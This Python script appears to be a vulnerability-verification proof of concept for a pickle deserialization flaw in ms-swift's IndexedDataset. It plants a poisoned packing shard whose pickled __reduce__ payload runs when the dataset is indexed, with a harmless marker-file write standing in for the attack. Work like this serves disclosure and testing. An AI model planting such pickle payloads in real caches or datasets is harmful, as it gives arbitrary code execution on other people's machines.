"""ms-swift v4.6.0 IndexedDataset pickle RCE at __getitem__ (data-*.bin shards, function level).

The verbatim pinned upstream file is loaded with the swift/modelscope tree stubbed.  A
benign ``data.idx`` indexes one record whose bytes in ``data-00000.bin`` are a pickled
reducing payload; the upstream ``__getitem__`` reads the slice through the upstream
``BinReader`` and executes it in ``pickle.loads``.
"""

from __future__ import annotations

import json
import pickle
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "lab" / "upstream_verify"))
from stublib import StubTree  # noqa: E402


def _materialize(marker_path: str, marker_text: str):
    Path(marker_path).write_text(marker_text, encoding="utf-8")
    return "record"


class _Payload:
    def __init__(self, marker_path: str, marker_text: str):
        self.marker_path = marker_path
        self.marker_text = marker_text

    def __reduce__(self):
        return (_materialize, (self.marker_path, self.marker_text))


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    source = poclib.upstream_path(manifest["root_cause"]["source"])
    if not source.is_file():
        poclib.fail(f"missing pinned upstream source: {source}")

    tree = StubTree(["swift", "modelscope"]).install()
    cache = poclib.EVIDENCE_DIR / "packing-cache"
    tree.seed("modelscope.hub.utils.utils", get_cache_dir=lambda *a, **k: str(cache))
    module = tree.load(source, "uv_swift_indexed_dataset")

    poclib.start_marker("ABSENT")
    poisoned = cache / "tmp" / "shard-poison"
    poisoned.mkdir(parents=True, exist_ok=True)
    payload = pickle.dumps(_Payload(str(poclib.MARKER_FILE), poclib.MARKER_TEXT), protocol=4)
    idx = {"idx": [0, len(payload)], "length": [len(payload)], "n_shard": 1, "shard_offset": [0]}
    (poisoned / "data.idx").write_bytes(pickle.dumps(idx, protocol=4))
    (poisoned / "data-00000.bin").write_bytes(payload)

    post_sink_error = None
    record = None
    try:
        dataset = module.IndexedDataset("shard-poison")
        record = dataset[0]
    except Exception as exc:  # the sink has already executed the payload
        post_sink_error = f"{type(exc).__name__}: {exc}"

    if not poclib.marker_ok():
        poclib.fail("marker was not written inside the upstream __getitem__ pickle.loads sink",
                    post_sink_error=post_sink_error)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+IndexedDataset[i]+pickle.loads(shard slice)",
                "entrypoint": "swift.dataset.indexed_dataset.IndexedDataset.__getitem__",
                "source": poclib.rel(source),
                "source_sha256": poclib.sha256_file(source),
                "sink_line": manifest["root_cause"]["line"],
                "sink": manifest["root_cause"]["snippet"],
                "cache_dir": poclib.rel(poisoned),
                "payload": "pickle __reduce__ -> _materialize(marker)",
                "record": str(record),
                "post_sink_error": post_sink_error,
                "stubbed_modules": tree.manifest()["stubbed_modules"],
            },
            "request_response": [
                {
                    "dir": "attacker-written packing shard -> BinReader.read_buffer -> pickle.loads",
                    "payload": "pickle reduce",
                    "result": "marker written inside the upstream sink",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
